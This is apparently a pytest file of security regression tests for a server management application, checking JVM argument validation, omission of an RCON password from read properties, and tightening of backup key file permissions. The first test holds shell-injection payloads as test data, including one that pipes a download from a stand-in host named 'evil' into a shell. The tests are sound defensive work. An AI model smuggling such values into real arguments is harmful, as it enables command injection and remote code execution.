import os
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from app.core.exceptions import InvalidValueError
from app.modules.server.application.read_models import _read_raw_properties
from app.modules.server.domain.value_objects import JavaArguments
from app.modules.storage.encryption import load_or_create_backup_key


def test_reproduce_jvm_arg_injection():
    """Demonstrate that JavaArguments rejects shell metacharacter injection payloads."""
    with pytest.raises(InvalidValueError):
        JavaArguments(["-Xmx1G;curl evil|sh"])
    with pytest.raises(InvalidValueError):
        JavaArguments(["-Xmx1G$(whoami)"])
    with pytest.raises(InvalidValueError):
        JavaArguments(["-Xmx1G & calc"])


def test_reproduce_raw_properties_secret_leak(tmp_path: Path):
    """Demonstrate that _read_raw_properties omits rcon.password."""
    props_file = tmp_path / "server.properties"
    props_file.write_text("rcon.password=supersecret\nmotd=Hello World\n")

    mock_dep = MagicMock()
    mock_dep.root_path = str(tmp_path)
    mock_dep.properties_path.return_value = str(props_file)

    raw = _read_raw_properties(mock_dep)
    assert "rcon.password" not in raw
    assert raw.get("motd") == "Hello World"


@pytest.mark.skipif(os.name != "posix", reason="POSIX file mode test")
def test_reproduce_key_file_permissions_not_tightened(tmp_path: Path):
    """Demonstrate that existing 0644 key files are tightened to 0600."""
    key_file = tmp_path / "backup_key.bin"
    key_file.write_bytes(os.urandom(32))
    os.chmod(key_file, 0o644)
    assert (key_file.stat().st_mode & 0o077) != 0

    load_or_create_backup_key(str(key_file))
    assert (key_file.stat().st_mode & 0o077) == 0
